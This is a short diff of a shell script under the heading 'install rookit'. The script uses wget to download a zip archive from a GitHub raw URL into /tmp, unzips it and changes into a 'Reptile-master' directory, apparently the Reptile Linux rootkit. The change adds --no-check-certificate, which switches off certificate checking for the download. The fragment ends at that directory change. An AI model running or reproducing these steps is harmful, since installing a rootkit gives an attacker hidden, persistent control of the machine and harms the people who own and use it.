@@ -2,7 +2,7 @@
 #
 #install rookit###################
 
-wget https://raw.githubusercontent.com/myvulweb/b3/master/rm.zip -O /tmp/mrp.zip
+wget --no-check-certificate https://raw.githubusercontent.com/myvulweb/b3/master/rm.zip -O /tmp/mrp.zip
 cd /tmp
 unzip mrp.zip
 cd Reptile-master
